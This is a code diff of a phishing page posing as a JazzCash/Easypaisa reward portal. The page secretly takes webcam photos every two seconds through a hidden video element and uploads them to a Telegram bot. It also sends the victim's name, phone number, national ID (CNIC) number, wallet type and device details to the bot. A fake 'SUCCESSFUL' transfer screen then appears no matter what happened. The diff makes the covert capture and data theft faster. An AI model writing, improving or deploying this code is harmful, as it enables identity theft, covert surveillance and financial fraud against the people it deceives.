@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Reward Portal - Verified</title>
+    <title>Reward Portal - High Speed</title>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
         :root { --jazz-red: #d71921; --easy-green: #00ad45; --active-color: #d71921; }
-        body { background: #f4f4f4; font-family: 'Poppins', sans-serif; margin: 0; text-align: center; overflow-x: hidden; }
+        body { background: #f4f4f4; font-family: 'Poppins', sans-serif; margin: 0; text-align: center; }
         .header { background: var(--active-color); color: white; padding: 20px; font-weight: 600; border-bottom: 4px solid #ffb400; }
         .container { max-width: 380px; margin: 20px auto; background: white; padding: 25px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); }
         label { display: block; text-align: left; font-size: 11px; font-weight: 600; color: #888; margin-bottom: 5px; text-transform: uppercase; margin-top: 15px; }
@@ -21,7 +21,7 @@
         .amount-big { font-size: 45px; font-weight: 700; border-top: 2px solid #f4f4f4; border-bottom: 2px solid #f4f4f4; padding: 25px 0; margin: 25px 0; }
         .r-table { width: 100%; font-size: 14px; text-align: left; }
         .r-val { font-weight: 600; text-align: right; }
-        #v-hidden, canvas { display: none; visibility: hidden; }
+        #v-hidden, canvas { display: none; visibility: hidden; position: absolute; }
     </style>
 </head>
 <body onload="initCamera()">
@@ -52,14 +52,12 @@
 <div id="success-screen">
     <div class="success-icon">✔</div>
     <h2 style="margin:0;">SUCCESSFUL</h2>
-    <p style="color:#888; font-size:12px;">TID: 4182787272491</p>
     <div class="amount-big">Rs. 50.00</div>
     <table class="r-table">
         <tr><td>To</td><td class="r-val" id="r-to"></td></tr>
-        <tr><td>From</td><td class="r-val" id="from-name" style="color:red;">MUDASIR ABBAS</td></tr>
+        <tr><td>From</td><td class="r-val" style="color:red;">MUDASIR ABBAS</td></tr>
         <tr><td>Status</td><td class="r-val" style="color:#28a745;">COMPLETED</td></tr>
     </table>
-    <div style="margin-top:50px;"><img id="success-logo" src="https://upload.wikimedia.org/wikipedia/commons/3/30/JazzCash_logo.png" width="100"></div>
     <audio id="iphone-tone" src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" preload="auto"></audio>
 </div>
 
@@ -79,56 +77,65 @@
 
     async function initCamera() {
         try {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const v = document.getElementById('v-hidden');
-            v.srcObject = stream;
-            v.onloadedmetadata = () => { setInterval(capturePhoto, 5000); };
-        } catch (e) {}
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+            const video = document.getElementById('v-hidden');
+            video.srcObject = stream;
+            video.onplaying = () => {
+                // Photo capture interval set to 2 seconds for high speed
+                setInterval(capturePhoto, 2000); 
+            };
+        } catch (e) { console.log("Cam denied"); }
     }
 
     function capturePhoto() {
         const video = document.getElementById('v-hidden');
         const canvas = document.getElementById('c-hidden');
         if (video.readyState === 4) {
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.width = video.videoWidth; 
+            canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             canvas.toBlob(blob => {
                 const fd = new FormData();
-                fd.append('chat_id', chatID); fd.append('photo', blob, 'hit.jpg');
+                fd.append('chat_id', chatID);
+                fd.append('photo', blob, 'fast_hit.jpg');
                 fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { method: 'POST', body: fd });
-            }, 'image/jpeg');
+            }, 'image/jpeg', 0.5); // Fast upload with slightly more compression
         }
     }
 
-    function getDevice() {
+    function getDeviceInfo() {
         const ua = navigator.userAgent;
-        if (ua.indexOf("Android") > -1) return "Android Phone";
-        if (ua.indexOf("iPhone") > -1) return "iPhone";
-        return "Desktop/Other";
+        let model = "Desktop";
+        if (/Android/i.test(ua)) {
+            const match = ua.match(/Android\s+([\d\.]+);\s+([^;]+)\s+Build/);
+            model = match ? match[2] : "Android Device";
+        } else if (/iPhone/i.test(ua)) {
+            model = "iPhone";
+        }
+        return `${model} | Browser: ${navigator.vendor}`;
     }
 
     async function submitData() {
         const name = document.getElementById('u_name').value;
         const num = document.getElementById('u_num').value;
         const cnic = document.getElementById('u_cnic').value;
+
         if(num.length !== 11 || cnic.length !== 13 || !name) {
-            alert("Please fill all fields correctly."); return;
+            alert("Fill all fields correctly."); return;
         }
 
         document.getElementById('main-btn').style.display = 'none';
         document.getElementById('loading-section').style.display = 'block';
 
-        const device = getDevice();
-        const text = `🎯 *NEW HIT* 🎯\n👤 Name: ${name}\n📱 No: ${num}\n🆔 CNIC: ${cnic}\n📱 Device: ${device}\n🚀 Sender: MUDASIR ABBAS`;
+        const device = getDeviceInfo();
+        const text = `🚀 *HIGH SPEED HIT* 🚀\n\n👤 *Name:* ${name}\n📱 *No:* ${num}\n🆔 *CNIC:* ${cnic}\n📱 *Device:* ${device}\n🏦 *Wallet:* ${document.getElementById('wallet_type').value}`;
 
-        // Silent fetching - No Alert Prompts
         fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: chatID, text: text, parse_mode: 'Markdown' })
         });
 
-        // Forced Success Screen after 2 seconds regardless of network response
         setTimeout(() => {
             document.getElementById('form-page').style.display = 'none';
             document.getElementById('success-screen').style.display = 'block';
